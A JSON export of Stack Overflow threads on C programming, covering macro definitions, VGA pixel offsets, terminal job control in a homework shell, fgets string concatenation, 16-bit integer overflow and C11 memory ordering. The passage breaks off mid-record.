[{"tags": ["c", "macros"], "comments": [{"owner": {"reputation": 568, "user_id": 4157408, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a44b6a712c8ad167e7331cef927d46a2?s=128&d=identicon&r=PG&f=1", "display_name": "void_ptr", "link": "https://stackoverflow.com/users/4157408/void-ptr"}, "edited": false, "score": 0, "creation_date": 1449705215, "post_id": 34191072, "comment_id": 56128912, "body": "Is there any reason for you to use <code>#define</code>s instead of constants?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 568, "user_id": 4157408, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a44b6a712c8ad167e7331cef927d46a2?s=128&d=identicon&r=PG&f=1", "display_name": "void_ptr", "link": "https://stackoverflow.com/users/4157408/void-ptr"}, "edited": false, "score": 0, "creation_date": 1449706317, "post_id": 34191072, "comment_id": 56129306, "body": "@void_ptr: C does not allow to define true constants. <code>cont</code> qualified objects are still variables. <code>#define</code> is the correct way. Even leaving apart that the first line could not be defined by a constant anyway."}], "answers": [{"comments": [{"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "reply_to_user": {"reputation": 159, "user_id": 2705419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd243a67e90feef63bae69e441801836?s=128&d=identicon&r=PG&f=1", "display_name": "Bob", "link": "https://stackoverflow.com/users/2705419/bob"}, "edited": false, "score": 0, "creation_date": 1449769168, "post_id": 34191088, "comment_id": 56161045, "body": "You can <a href=\"http://meta.stackexchange.com/questions/5234/how-does-accepting-an-answer-work\">accept the answer</a> if it helped you :)"}], "tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": true, "score": 4, "last_activity_date": 1449704164, "creation_date": 1449704164, "answer_id": 34191088, "question_id": 34191072, "link": "https://stackoverflow.com/questions/34191072/defines-and-logic-in-c-microprocessors/34191088#34191088", "title": "defines and logic in c, microprocessors", "body": "<p>Remove the semi-colons at the end of the macro definitions:</p>\n\n<p>i.e.\nChange from</p>\n\n<pre><code>#define pressed 0;\n#define released 1;\n</code></pre>\n\n<p>to</p>\n\n<pre><code>#define pressed 0\n#define released 1\n</code></pre>\n\n<p>With the semi-colon, the <code>if</code> statement would look like this after the macro substitution:</p>\n\n<pre><code> if (PBrun == 0;){\n        debouncedone = false;\n    }\n</code></pre>\n\n<p>This obviously produces syntax errors.</p>\n"}], "owner": {"reputation": 159, "user_id": 2705419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bd243a67e90feef63bae69e441801836?s=128&d=identicon&r=PG&f=1", "display_name": "Bob", "link": "https://stackoverflow.com/users/2705419/bob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 0, "accepted_answer_id": 34191088, "answer_count": 1, "score": 0, "last_activity_date": 1449704164, "creation_date": 1449704113, "question_id": 34191072, "link": "https://stackoverflow.com/questions/34191072/defines-and-logic-in-c-microprocessors", "title": "defines and logic in c, microprocessors", "body": "<p>What is wrong with this code? I am new to c but I cannot understand what I have done wrong by using macros inside if statements. It gives me an unexpected token error.</p>\n\n<pre><code>#define PBrun PORTBbits.RB10\n#define pressed 0;\n#define released 1;\n\nint debouncedone = true;\n\nvoid debouncetimerdone(){\n    debouncedone = true;\n    if (PBrun == pressed){\n        debouncedone = false;\n    }\n}\n</code></pre>\n\n<p>When I replace the macros with their meaning the code works fine.</p>\n"}, {"tags": ["c", "vga"], "answers": [{"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 2, "last_activity_date": 1449704250, "creation_date": 1449704250, "answer_id": 34191104, "question_id": 34190985, "link": "https://stackoverflow.com/questions/34190985/vga-programming-in-c-getting-the-x-y-coordinates-from-and-offset/34191104#34191104", "title": "VGA Programming in C: Getting the x, y coordinates from and offset", "body": "<p>Simple reverse the math.  Best to use <code>unsigned</code> types.</p>\n\n<pre><code>y = offset/((1&lt;&lt;8) + (1&lt;&lt;6)); \nx = offset%((1&lt;&lt;8) + (1&lt;&lt;6)); \n</code></pre>\n"}], "owner": {"reputation": 2382, "user_id": 2370400, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5a0796d3f5a35d57f483d7d13d884007?s=128&d=identicon&r=PG", "display_name": "Pablo Estrada", "link": "https://stackoverflow.com/users/2370400/pablo-estrada"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 437, "favorite_count": 0, "accepted_answer_id": 34191104, "answer_count": 1, "score": 1, "last_activity_date": 1449704250, "creation_date": 1449703658, "last_edit_date": 1449703802, "question_id": 34190985, "link": "https://stackoverflow.com/questions/34190985/vga-programming-in-c-getting-the-x-y-coordinates-from-and-offset", "title": "VGA Programming in C: Getting the x, y coordinates from and offset", "body": "<p>I'm programming the for the 256 color VGA in C. The screen size I have is 320*200 so based on that assumption I made my plot pixel function as follows:</p>\n\n<pre><code>void plot_pixel(int x, int y, byte color){\n  int offset;\n  offset = (y&lt;&lt;8) + (y&lt;&lt;6) + x;\n  VGA[offset]=color;\n}\n</code></pre>\n\n<p>I always translate the x, y coordinates of my screen to an offset of video memory. What I'm struggling to achieve is to do the opposite. I would like to send a function the video offset and return to me an array with the 2 integers corresponding to the x and y coordinates:</p>\n\n<pre><code>get_xy(int offset){\n   ...\n}\n</code></pre>\n\n<p>However, I still cannot find a way to translate a single number into two values.</p>\n\n<p>Can anyone help me achieve this?</p>\n"}, {"tags": ["c", "linux", "shell"], "comments": [{"owner": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 0, "creation_date": 1449705177, "post_id": 34190951, "comment_id": 56128895, "body": "Related: <a href=\"http://stackoverflow.com/questions/5341220/how-do-i-get-tcsetpgrp-to-work-in-c\">How do I get tcsetpgrp() to work in C</a>. Your shell will stop when it&#39;s the background process and tries to change the tty&#39;s pgrp. Fix is to (temporarily) ignore SIGTTOU."}, {"owner": {"reputation": 71, "user_id": 5478189, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/fd28e0954280668443fc36cc6e737f6f?s=128&d=identicon&r=PG&f=1", "display_name": "Ali Can &#220;st&#252;nel", "link": "https://stackoverflow.com/users/5478189/ali-can-%c3%9cst%c3%bcnel"}, "reply_to_user": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 0, "creation_date": 1449710285, "post_id": 34190951, "comment_id": 56130559, "body": "Thank you for your help adding &quot;signal(SIGTTOU, SIG_IGN);&quot; before tcsetpgrp solved my problem. However, I need to use Ctrl+Z command to stop process, so I can&#39;t do that when I ignore it."}, {"owner": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 0, "creation_date": 1449741427, "post_id": 34190951, "comment_id": 56142631, "body": "Control-Z sends a SIGTSTP signal to the foreground process group. It has a similar effect as SIGTTOU, but they&#39;re different signals. Is adding the line of code that ignores SIGTTOU preventing Control-Z from working correctly?"}, {"owner": {"reputation": 71, "user_id": 5478189, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/fd28e0954280668443fc36cc6e737f6f?s=128&d=identicon&r=PG&f=1", "display_name": "Ali Can &#220;st&#252;nel", "link": "https://stackoverflow.com/users/5478189/ali-can-%c3%9cst%c3%bcnel"}, "reply_to_user": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 0, "creation_date": 1449791952, "post_id": 34190951, "comment_id": 56172455, "body": "I have used sigprocmask to ignore SIGTTOU temporarily, but when I press the Ctrl-Z it writes just ^Z not stop the current process, but Ctrl-C works well. For example when I write &gt;&gt;cat then press the Ctrl-C it terminates and turns my own shell. I am really confused"}, {"owner": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 1, "creation_date": 1449794049, "post_id": 34190951, "comment_id": 56173138, "body": "Before you added the sigprocmask call, did Control-Z work?"}, {"owner": {"reputation": 71, "user_id": 5478189, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/fd28e0954280668443fc36cc6e737f6f?s=128&d=identicon&r=PG&f=1", "display_name": "Ali Can &#220;st&#252;nel", "link": "https://stackoverflow.com/users/5478189/ali-can-%c3%9cst%c3%bcnel"}, "reply_to_user": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 0, "creation_date": 1449795110, "post_id": 34190951, "comment_id": 56173468, "body": "Not actually it stops the my own shell turns back the linux shell, but I need to stop process and turn back to my own shell to take next command"}, {"owner": {"reputation": 7668, "user_id": 2554472, "user_type": "registered", "profile_image": "https://graph.facebook.com/1119155584/picture?type=large", "display_name": "Mark Plotnick", "link": "https://stackoverflow.com/users/2554472/mark-plotnick"}, "edited": false, "score": 1, "creation_date": 1449872389, "post_id": 34190951, "comment_id": 56210779, "body": "Can you ask that as a new question? If you can, please include all the code in the parent and child that does any setpgid, tcsetgrp, fork, waitpid, and exec* calls."}], "answers": [{"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 1, "last_activity_date": 1505977091, "creation_date": 1505977091, "answer_id": 46337364, "question_id": 34190951, "link": "https://stackoverflow.com/questions/34190951/how-can-i-put-my-own-shell-into-foreground-after-waitpid-call/46337364#46337364", "title": "How can I put my own shell into foreground after waitpid call?", "body": "<p>adding \"signal(SIGTTOU, SIG_IGN);\" before tcsetpgrp solved my problem. \u2013 Ali Can \u00dcst\u00fcnel</p>\n"}], "owner": {"reputation": 71, "user_id": 5478189, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/fd28e0954280668443fc36cc6e737f6f?s=128&d=identicon&r=PG&f=1", "display_name": "Ali Can &#220;st&#252;nel", "link": "https://stackoverflow.com/users/5478189/ali-can-%c3%9cst%c3%bcnel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 674, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1505977091, "creation_date": 1449703464, "last_edit_date": 1449704431, "question_id": 34190951, "link": "https://stackoverflow.com/questions/34190951/how-can-i-put-my-own-shell-into-foreground-after-waitpid-call", "title": "How can I put my own shell into foreground after waitpid call?", "body": "<p>I am trying make my own shell for my school homework, after the sucessfull fork call, I want to put pid which comes from fork() function into foreground and then I want to put my own shell into background. Then after the waitpid function, I need to my own shell into foreground again. For this I think like this:</p>\n\n<pre><code>        if(tcsetpgrp(0, getpgid(pid))!=0)\n        perror(\"Foreground error: \");\n\n        waitpid(pid, NULL, 0);\n\n        if(tcsetpgrp(0, getpgid(shellpid))!=0)\n        perror(\"Foreground error: \");}\n</code></pre>\n\n<p>But after new process finishes, the linux shell stops my own shell.\nFor instance, ls command is the new process in the picture.\n<a href=\"http://i.stack.imgur.com/OQ4LE.png\" rel=\"nofollow\">Please look at here: for terminal screen shot</a></p>\n"}, {"tags": ["c++", "c", "loops", "buffer", "fgets"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1449703136, "post_id": 34190835, "comment_id": 56128129, "body": "C or C ++, because c++ container classes are much easier to use than, say malloc/realloc and pointer arrays/realloc."}, {"owner": {"reputation": 4251, "user_id": 4605105, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh4.googleusercontent.com/-_cFfGx1khYs/AAAAAAAAAAI/AAAAAAAAGt0/vfQ_28nwAEE/photo.jpg?sz=128", "display_name": "&#212;rel", "link": "https://stackoverflow.com/users/4605105/%c3%94rel"}, "edited": false, "score": 0, "creation_date": 1449704344, "post_id": 34190835, "comment_id": 56128580, "body": "You need to stop your for loop at the end of <code>buffer</code> or best when <code>buffer[i] == &#39;\\0&#39;</code> perhaps add a space between words and finally add the final <code>\\0</code> You can directly use <code>array + numberOfChars</code> in fgets"}], "answers": [{"comments": [{"owner": {"reputation": 1735, "user_id": 1707083, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/08d10a00a81504b18d3d3723a4b7c252?s=128&d=identicon&r=PG", "display_name": "Samer", "link": "https://stackoverflow.com/users/1707083/samer"}, "edited": false, "score": 1, "creation_date": 1449706272, "post_id": 34191388, "comment_id": 56129286, "body": "try to point out to where the error is  in the OP code and if you could add more explanation to benefit more folks in here..."}, {"owner": {"reputation": 33, "user_id": 5661545, "user_type": "registered", "profile_image": "https://graph.facebook.com/100008127580820/picture?type=large", "display_name": "Kostas Papageorge", "link": "https://stackoverflow.com/users/5661545/kostas-papageorge"}, "edited": false, "score": 0, "creation_date": 1449745770, "post_id": 34191388, "comment_id": 56145479, "body": "Thanks you @OlivierPellier-Cuit for your solution it works fine! But when I print array I am getting:&#39;first two&#39; one string in each line   instead of: &#39;first two&#39; all strings in one line  Is this a problem ?because I want count the words of the array"}, {"owner": {"reputation": 1204, "user_id": 5661651, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-8mVBFGAZyDk/AAAAAAAAAAI/AAAAAAAC4XI/lU_L3VQlSug/photo.jpg?sz=128", "display_name": "Olivier Pellier-Cuit", "link": "https://stackoverflow.com/users/5661651/olivier-pellier-cuit"}, "edited": false, "score": 0, "creation_date": 1449755716, "post_id": 34191388, "comment_id": 56151770, "body": "It&#39;s because fgets add a end of line char. You could remove it but it will not be a problem if you just want to count the words"}, {"owner": {"reputation": 33, "user_id": 5661545, "user_type": "registered", "profile_image": "https://graph.facebook.com/100008127580820/picture?type=large", "display_name": "Kostas Papageorge", "link": "https://stackoverflow.com/users/5661545/kostas-papageorge"}, "edited": false, "score": 0, "creation_date": 1449756300, "post_id": 34191388, "comment_id": 56152210, "body": "Thank you very much for your help!"}], "tags": [], "owner": {"reputation": 1204, "user_id": 5661651, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-8mVBFGAZyDk/AAAAAAAAAAI/AAAAAAAC4XI/lU_L3VQlSug/photo.jpg?sz=128", "display_name": "Olivier Pellier-Cuit", "link": "https://stackoverflow.com/users/5661651/olivier-pellier-cuit"}, "is_accepted": true, "score": 3, "last_activity_date": 1449709264, "last_edit_date": 1449709264, "creation_date": 1449705763, "answer_id": 34191388, "question_id": 34190835, "link": "https://stackoverflow.com/questions/34190835/how-to-add-a-string-from-a-buffer-to-another-array-and-print-this/34191388#34191388", "title": "How to add a string from a buffer to another array and print this?", "body": "<p>See comments in the code:</p>\n\n<pre><code>position=0;\nprintf(\"Enter a text: \\n\");\nwhile(fgets(buffer, 100 , stdin) != NULL){\n\n    /* because you want to add space between 'first' and 'two' */ \n    if (position != 0) {\n        array[position] = ' ';\n        position++;\n    }\n\n    /* you need to get the buffer len for THIS iteration */\n    numberOfChars=strlen(buffer);\n\n    for (i=position;i&lt;(position+numberOfChars);i++){\n        /* i is a valid indice for array but not for buffer[0..numberOfChars-1] */\n        /* array[i]=buffer[i]; */\n        array[i] = buffer[i-position];\n    }\n\n    /* adding one will not add a space char */\n    /* position=position+numberOfChars+1; */\n    position = position+numberOfChars;\n}\n\n/* finaly add the null char at the end of the string (string is null terminated) */\narray[position] = '\\0';\n</code></pre>\n\n<p>You may also try this:</p>\n\n<pre><code>printf(\"Enter a text: \\n\");\n\n/* set array as an empty string */\narray[0] = 0;\n\n/* read from stdin */\nwhile(fgets(buffer, 100, stdin) != NULL) {\n\n    /* append a space to array if it isn't empty */\n    if (array[0] != 0) \n        strcat(array, \" \");\n\n    /* append buffer to array */\n    strcat(array, buffer)\n}\n\n/* print resulting array */\nprintf(\"%s\\n\");\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 8069, "user_id": 296923, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/cb7b3af2d2d967711454dc8d9c21798f?s=128&d=identicon&r=PG", "display_name": "Ziffusion", "link": "https://stackoverflow.com/users/296923/ziffusion"}, "is_accepted": false, "score": 0, "last_activity_date": 1449714978, "creation_date": 1449714978, "answer_id": 34192773, "question_id": 34190835, "link": "https://stackoverflow.com/questions/34190835/how-to-add-a-string-from-a-buffer-to-another-array-and-print-this/34192773#34192773", "title": "How to add a string from a buffer to another array and print this?", "body": "<p>Note that fgets() stores the newline read from the stdin into the buffer as well. So, you want to get rid of it. <em>And</em> you want to put an extra space between the two words. Also, you are initializing numberOfChars too late. It should happen before it is used in the copy loop.</p>\n\n<p>Try this:</p>\n\n<pre><code>position = 0;\nprintf(\"Enter a text: \\n\");\nwhile(fgets(buffer, 100 , stdin) != NULL) {\n    numberOfChars = strlen(buffer);\n    buffer[numberOfChars - 1] = ' '; //this replaces newline with space\n    // note that i &lt;= in the condition; to copy the '\\0' over\n    for (i = position; i &lt;= (position + numberOfChars); i++) {\n        array[i] = buffer[i];\n    }        \n    position = position + numberOfChars;\n}\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 5661545, "user_type": "registered", "profile_image": "https://graph.facebook.com/100008127580820/picture?type=large", "display_name": "Kostas Papageorge", "link": "https://stackoverflow.com/users/5661545/kostas-papageorge"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 91, "favorite_count": 0, "accepted_answer_id": 34191388, "answer_count": 2, "score": 0, "last_activity_date": 1449714978, "creation_date": 1449702887, "last_edit_date": 1449706415, "question_id": 34190835, "link": "https://stackoverflow.com/questions/34190835/how-to-add-a-string-from-a-buffer-to-another-array-and-print-this", "title": "How to add a string from a buffer to another array and print this?", "body": "<p>So basically I want to write a word, and when I press enter I want to store this string from buffer to array. As I write the first word it might work but when I want to add a second word it is getting tricky.</p>\n\n<pre><code>e.g.1st input is:first\\0\n    2nd input is:two\\0\n    then:Ctrl+Z(to get out of the loop)\n    Output I want:first two (actually printing the 'array' array.)\n</code></pre>\n\n<p>My Code is Here:</p>\n\n<pre><code>position=0;\nprintf(\"Enter a text: \\n\");\nwhile(fgets(buffer, 100 , stdin) != NULL){\n    for (i=position;i&lt;(position+numberOfChars);i++){\n        array[i]=buffer[i];\n    }\n    numberOfChars=strlen(buffer);\n    position=position+numberOfChars+1;\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 1, "creation_date": 1449702800, "post_id": 34190776, "comment_id": 56127997, "body": "If ints are only 16 bits in that environment, you&#39;re well into &quot;setting the sign bit&quot; territory with those shifts (33280 definitely has the sign bit of a 16 bit int set)"}, {"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 1, "creation_date": 1449703041, "post_id": 34190776, "comment_id": 56128098, "body": "@OliverCharlesworth Just edited my comment - expected result = 0x8200, so clearly the addition of the 2 shifts does cause the a 16 bit overflow issue."}], "answers": [{"comments": [{"owner": {"reputation": 2382, "user_id": 2370400, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5a0796d3f5a35d57f483d7d13d884007?s=128&d=identicon&r=PG", "display_name": "Pablo Estrada", "link": "https://stackoverflow.com/users/2370400/pablo-estrada"}, "edited": false, "score": 0, "creation_date": 1449703287, "post_id": 34190854, "comment_id": 56128179, "body": "Thanks for the info. Is there any way I can make this a number positive. Can I explictly change the size of an int in the BORLAND compiler?"}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "reply_to_user": {"reputation": 2382, "user_id": 2370400, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5a0796d3f5a35d57f483d7d13d884007?s=128&d=identicon&r=PG", "display_name": "Pablo Estrada", "link": "https://stackoverflow.com/users/2370400/pablo-estrada"}, "edited": false, "score": 1, "creation_date": 1449703379, "post_id": 34190854, "comment_id": 56128213, "body": "You can change the type of <code>h</code> to <code>unsigned int</code>. But that gives twice the range which is also very small on a 16-bit machine (2^16 - 1). So you need to be care if you are going to use signed ints. Unsigned integers don&#39;t overflow but wrap around. So the behaviour is defined but still may not very useful if you want to do calculations."}], "tags": [], "owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "is_accepted": false, "score": 5, "last_activity_date": 1449702982, "creation_date": 1449702982, "answer_id": 34190854, "question_id": 34190776, "link": "https://stackoverflow.com/questions/34190776/left-shifting-a-positive-int-is-giving-me-a-negative-number/34190854#34190854", "title": "left shifting a positive int is giving me a negative number", "body": "<p>On Borland C compiler, the size of int is 16-bits. So the statement</p>\n\n<pre><code>h = (h&lt;&lt;8)+(h&lt;&lt;6);\n</code></pre>\n\n<p><a href=\"https://en.wikipedia.org/wiki/Integer_overflow\">overflows a signed integer</a>. The individual shift operations are fine as the results are within the limit of what a 16-bit signed integer can hold. But the addition results in overflow. Signed integer overflow is <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\"><em>undefined behaviour</em></a> in C.</p>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 1, "last_activity_date": 1449703432, "creation_date": 1449703432, "answer_id": 34190944, "question_id": 34190776, "link": "https://stackoverflow.com/questions/34190776/left-shifting-a-positive-int-is-giving-me-a-negative-number/34190944#34190944", "title": "left shifting a positive int is giving me a negative number", "body": "<p>It seems In the environment where the program was run type <code>int</code> has width of 2 bytes and its maximum value is <code>+32767</code>. </p>\n\n<p>So when a positive value exceedes this limit then the sign bit can be set and you get a negative value.</p>\n\n<p>You can check the maximum poisitive value that can be stored in an object of type int the following way</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;limits.h&gt;\n\nint main( void )\n{\n    printf( \"The maximum is %d\\n\", INT_MAX );\n}\n</code></pre>\n\n<p>Instead of the type int you could use type <code>unsigned int</code> or type <code>long</code> or <code>unsigned long</code></p>\n\n<p>For example the maximum value for type <code>unsigned int</code> provided by your compiler can be equal to <code>65535</code>. It is enough to store the result of your expression.</p>\n"}], "owner": {"reputation": 2382, "user_id": 2370400, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/5a0796d3f5a35d57f483d7d13d884007?s=128&d=identicon&r=PG", "display_name": "Pablo Estrada", "link": "https://stackoverflow.com/users/2370400/pablo-estrada"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 305, "favorite_count": 0, "accepted_answer_id": 34190944, "answer_count": 2, "score": 2, "last_activity_date": 1449703432, "creation_date": 1449702556, "question_id": 34190776, "link": "https://stackoverflow.com/questions/34190776/left-shifting-a-positive-int-is-giving-me-a-negative-number", "title": "left shifting a positive int is giving me a negative number", "body": "<p>I\u00b4m using shift to make optimizations on some math I have to do in a program written in C:</p>\n\n<pre><code>int h;\nh = 104;\nh = (h&lt;&lt;8)+(h&lt;&lt;6);\nprintf(\"offset: %d\",h);\n</code></pre>\n\n<p>I get this result:</p>\n\n<pre><code>offset: -32256\n</code></pre>\n\n<p>When what I expect is </p>\n\n<pre><code>(104* (2^8) ) +  (104 * (2^6)) = 33280\n</code></pre>\n\n<p>Can anyone explain why I\u00b4m getting the negative result and what can I do to get the result I expect?</p>\n\n<p>I\u00b4m using the BORLANDC compiler with DOSBOX to run my program if that\u00b4s useful.</p>\n"}, {"tags": ["c", "c11", "memory-model", "memory-barriers", "memory-fences"], "answers": [{"comments": [{"owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449767893, "post_id": 34198660, "comment_id": 56160236, "body": "Thanks for the missing fence.  Can you make your argument based on the C11 standard text?  At a minimum, this requires showing a) that two conflicting <code>memory_order_relaxed</code> operations do not create a data race (and hence undefined behavior), and b) that, as you say, the C11 spec guarantees read-read coherence."}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "reply_to_user": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449776089, "post_id": 34198660, "comment_id": 56164543, "body": "I have updated my answer with references to the standard."}, {"owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449855551, "post_id": 34198660, "comment_id": 56202656, "body": "Thanks for the references.  Unfortunately, I still cannot connect your second quote to my question.  Does M correspond to b here, while A and X both correspond to p2&#39;s write of b and B corresponds to p3&#39;s read of b?  Then somehow for the language to be relevant you need to argue that A happens before B.  Seems intuitive given that B observed A&#39;s side effect, but A would have to inter-thread happen before B.  How do you argue that?  Does A synchronize with B (and if so by what argument)?  Or is it the accesses to a that synchronize with respect to each other?"}, {"owner": {"reputation": 44923, "user_id": 3440745, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/56e5b88faef87b734150f28962f0c8e5?s=128&d=identicon&r=PG&f=1", "display_name": "Tsyvarev", "link": "https://stackoverflow.com/users/3440745/tsyvarev"}, "reply_to_user": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/456b429580f304e24b652ca52363b603?s=128&d=identicon&r=PG&f=1", "display_name": "user3188445", "link": "https://stackoverflow.com/users/3188445/user3188445"}, "edited": false, "score": 0, "creation_date": 1449865635, "post_id": 34198660, "comment_id": 56207780, "body": "No, <i>read-read coherence</i>, described by the second quote, is related to accesses to <code>a</code> (as <i>M</i>): <i>A</i> is reading in <code>p2</code>, <i>B</i> is reading in <code>p3</code>, <i>X</i> is writting in <code>p1</code>. <i>A</i> sees effect of <i>X</i> (otherwise <i>B</i> won&#39;t occure). So <i>B</i> also sees effect of <i>X</i>. Happens-before order between <i>A</i> and <i>B</i> is classic and is provided by accesses to <code>b</code> and fences. If you failed to catch reason of that happens-before, you better ask new question: it is fundamental one, and I&#39;m sure it will collect many views(and upvotes)."}, {"owner": {"reputation": 2063, "user_id": 3188445, "user_type": "registered", "accept_rate": 64, "profile_image": 